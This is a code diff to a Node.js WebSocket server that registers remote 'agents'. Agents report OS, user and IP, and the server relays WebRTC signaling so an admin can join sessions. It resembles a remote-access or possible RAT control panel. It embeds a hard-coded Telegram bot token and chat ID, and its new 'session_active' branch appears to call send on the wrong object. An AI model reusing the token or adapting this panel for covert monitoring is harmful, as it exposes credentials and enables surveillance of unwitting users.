@@ -13,15 +13,12 @@ const wss = new WebSocket.Server({ server });
 const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
 const TELEGRAM_CHAT_ID = '6172226452';
 
-// In-memory Database
 let knownUsers = {}; 
 let clients = {}; 
 
 // Telegram Spam Protection
 const tgCooldown = {}; 
-const TG_COOLDOWN_MS = 60 * 1000; // Reduced to 1 minute for better feedback during testing
-
-// --- HELPER FUNCTIONS ---
+const TG_COOLDOWN_MS = 60 * 1000; 
 
 function logToFile(msg) {
  const timestamp = new Date().toISOString();
@@ -69,7 +66,6 @@ function broadcastLogToAdmins(line) {
  });
 }
 
-// --- HTTP ROUTING ---
 app.use(express.static(__dirname)); 
 
 app.get('/', (req, res) => {
@@ -81,11 +77,10 @@ app.get('/health', (req, res) => {
  res.end('OK');
 });
 
-// --- WEBSOCKET HANDLING ---
 wss.on('connection', (ws, req) => {
  let id = uuidv4().substr(0, 8);
  ws.id = id;
- clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false, currentSession: null };
+ clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };
 
  logToFile(`[+] Client Connected: ${id}`);
  ws.send(JSON.stringify({ type: 'registered', id: id }));
@@ -103,7 +98,6 @@ wss.on('connection', (ws, req) => {
    const data = JSON.parse(msgRaw);
    logToFile(`[MSG] Received from ${id}: ${data.type}`);
 
-   // 1. Admin Registration
    if (data.type === 'register_admin') {
     clients[id].isAdmin = true;
     logToFile(`[ADMIN] Connected with ID: ${id}`);
@@ -120,7 +114,6 @@ wss.on('connection', (ws, req) => {
     return;
    }
 
-   // 2. Agent Info Packet
    if (data.type === 'info') {
     clients[id].info = data;
     clients[id].lastSeen = Date.now();
@@ -133,7 +126,6 @@ wss.on('connection', (ws, req) => {
     broadcastToAdmin(id, data);
     notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os || 'Unknown'}\nUser: ${data.user || 'Unknown'}\nIP: ${data.ip || 'Unknown'}`);
    } 
-   // 3. Heartbeat
    else if (data.type === 'heartbeat') {
     clients[id].lastSeen = Date.now();
     if (knownUsers[id]) {
@@ -141,9 +133,7 @@ wss.on('connection', (ws, req) => {
      knownUsers[id].status = 'Online';
     }
    } 
-   // 4. Join Request Handling (Agent -> Admin)
    else if (data.type === 'join_request') {
-    // If agent initiates, forward to all admins
     wss.clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN && client.isAdmin) {
       client.send(JSON.stringify({
@@ -154,7 +144,6 @@ wss.on('connection', (ws, req) => {
      }
     });
    }
-   // 5. Admin Requests Join (Admin -> Agent)
    else if (data.type === 'request_join') {
     const targetId = data.targetId;
     if (clients[targetId]) {
@@ -162,16 +151,15 @@ wss.on('connection', (ws, req) => {
      if (targetWs.readyState === WebSocket.OPEN) {
       targetWs.send(JSON.stringify({
        type: 'join_request',
-       from: id, // This is the Admin ID
+       from: id, 
        timestamp: Date.now()
       }));
       logToFile(`[ADMIN] Requested join to ${targetId}`);
      }
     }
    }
-   // 6. WebRTC Signaling Forwarding
+   // Signaling Forwarding
    else if (['offer', 'answer', 'candidate'].includes(data.type)) {
-    // If Admin sends to specific Agent
     if (clients[id].isAdmin && data.targetId) {
      if (clients[data.targetId]) {
       const targetWs = clients[data.targetId].ws;
@@ -180,7 +168,6 @@ wss.on('connection', (ws, req) => {
       }
      }
     } 
-    // If Agent sends to Admin (or generic fallback)
     else if (!clients[id].isAdmin) {
      wss.clients.forEach(client => {
       if (client.readyState === WebSocket.OPEN && client.isAdmin) {
@@ -194,9 +181,7 @@ wss.on('connection', (ws, req) => {
      });
     }
    }
-   // 7. Join Accepted / Session Established
-   else if (data.type === 'join_accepted') {
-    // Update Admin UI that this session is active
+   else if (data.type === 'session_active') {
     if (clients[id].isAdmin) {
      clients[id].send(JSON.stringify({
       type: 'session_active',
